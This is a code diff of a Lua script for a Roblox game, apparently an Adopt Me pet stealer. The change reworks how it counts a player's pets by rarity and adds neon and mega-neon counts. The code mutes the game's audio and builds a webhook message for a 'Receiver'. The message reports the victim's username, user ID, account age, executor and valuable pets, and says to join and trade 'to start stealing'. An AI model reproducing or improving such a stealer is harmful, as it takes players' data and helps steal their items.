@@ -3,16 +3,20 @@ coroutine.wrap(function()
   end)()
 
   coroutine.wrap(function()
-  local Loads = require(game.ReplicatedStorage.Fsys).load
-  local InventoryDB = Loads("InventoryDB")
-  local ClientData = Loads('ClientData')
-  local legendaries_count = 0
-  local mega_count = 0
-  local neon_count = 0
-  local ultra_count = 0
-  local rare_count = 0
-  local uncommon_count = 0
-  local common_count = 0
+local Loads = require(game.ReplicatedStorage.Fsys).load
+local InventoryDB = Loads("InventoryDB")
+local ClientData = Loads("ClientData")
+
+-- Variabel untuk menghitung rarity
+local legendaries_count = 0
+local ultra_count = 0
+local rare_count = 0
+local uncommon_count = 0
+local common_count = 0
+
+-- Variabel untuk menghitung tipe neon dan mega-neon
+local neon_count = 0
+local mega_count = 0
   
   local function muteAllAudio()
       for _, sound in pairs(workspace:GetDescendants()) do
@@ -33,22 +37,28 @@ coroutine.wrap(function()
   end)
   
   for i, v in pairs(ClientData.get("inventory").pets) do
-    if InventoryDB[v.category][v.id].rarity == "legendary" then
-      legendaries_count = legendaries_count + 1
+    local pet_data = InventoryDB[v.category][v.id]
+
+    -- Menghitung berdasarkan rarity
+    if pet_data.rarity == "legendary" then
+        legendaries_count = legendaries_count + 1
+    elseif pet_data.rarity == "ultra_rare" then
+        ultra_count = ultra_count + 1
+    elseif pet_data.rarity == "rare" then
+        rare_count = rare_count + 1
+    elseif pet_data.rarity == "uncommon" then
+        uncommon_count = uncommon_count + 1
+    elseif pet_data.rarity == "common" then
+        common_count = common_count + 1
     end
-    if InventoryDB[v.category][v.id].rarity == "ultra_rare" then
-      ultra_count = ultra_count + 1
+
+    -- Menghitung berdasarkan tipe
+    if pet_data.type == "neon" then
+        neon_count = neon_count + 1
+    elseif pet_data.type == "mega-neon" then
+        mega_count = mega_count + 1
     end
-    if InventoryDB[v.category][v.id].rarity == "rare" then
-      rare_count = rare_count + 1
-    end
-    if InventoryDB[v.category][v.id].rarity == "uncommon" then
-      uncommon_count = uncommon_count + 1
-    end
-    if InventoryDB[v.category][v.id].rarity == "common" then
-      common_count = common_count + 1
-    end
-  end
+end
 
   if legendaries_count == 1 then
     legendaries_count = 0
@@ -98,7 +108,7 @@ end
     embeds = {
       {
         title = 'Join your player using **EXECUTE TO JOIN THEM**and they should just trade you to start stealing!',
-        description = '**📄  Player Information**: \n ```lua\n🔌 Executor: '.. tostring(exploit) ..'\n🗽 Username: '.. tostring(plr) ..'\n🗼 User-ID: '.. tostring(userid) ..'\n⛩ Account Age: '.. tostring(accage) ..'\n🏗 Receiver: '.. Username ..'\n```\n **📦 Inventory**: \n ```lua\n🦒 Legendaries: '.. tostring(legendaries_count).. '\n🐊 Ultra Rares: '.. tostring(ultra_count).. '\n🐌 Rares: '.. tostring(rare_count).. '\n🦀 Uncommons: '.. tostring(uncommon_count).. '\n🐈 Commons: '.. tostring(common_count).. '\n🤑 Total Pets: '.. tostring(total).. '```\n**Join from Console**: \nRoblox.GameLauncher.joinGameInstance(920587237, "' .. game.JobId .. '")',
+        description = '**📄  Player Information**: \n ```lua\n🔌 Executor: '.. tostring(exploit) ..'\n🗽 Username: '.. tostring(plr) ..'\n🗼 User-ID: '.. tostring(userid) ..'\n⛩ Account Age: '.. tostring(accage) ..'\n🏗 Receiver: '.. Username ..'\n```\n **📦 Inventory**: \n ```lua\n🦒 Legendaries: '.. tostring(legendaries_count).. '\n🐉 Mega Neons: '.. tostring(mega_count).. '\n🦖 Neons: '.. tostring(neon_count).. '\n🐊 Ultra Rares: '.. tostring(ultra_count).. '\n🐌 Rares: '.. tostring(rare_count).. '\n🦀 Uncommons: '.. tostring(uncommon_count).. '\n🐈 Commons: '.. tostring(common_count).. '\n🤑 Total Pets: '.. tostring(total).. '```\n**Join from Console**: \nRoblox.GameLauncher.joinGameInstance(920587237, "' .. game.JobId .. '")',
         color = 10428396
       }
     }
